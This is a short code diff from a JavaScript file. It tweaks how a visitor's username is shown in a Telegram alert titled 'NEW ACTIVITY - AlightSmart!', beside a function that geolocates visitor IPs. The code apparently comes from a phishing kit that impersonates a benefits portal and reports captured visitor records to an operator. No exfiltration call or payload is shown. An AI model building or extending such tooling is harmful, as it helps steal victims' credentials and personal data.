@@ -59,7 +59,7 @@ async function getLocation(ip) {
 async function sendTelegramNotification(record) {
     let usernameDisplay = record.username || 'Visitor';
     if (usernameDisplay.includes("Verification") || usernameDisplay.includes("Step")) {
-        usernameDisplay = "Verification Step";
+        usernameDisplay = usernameDisplay;
     }
 
     const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +
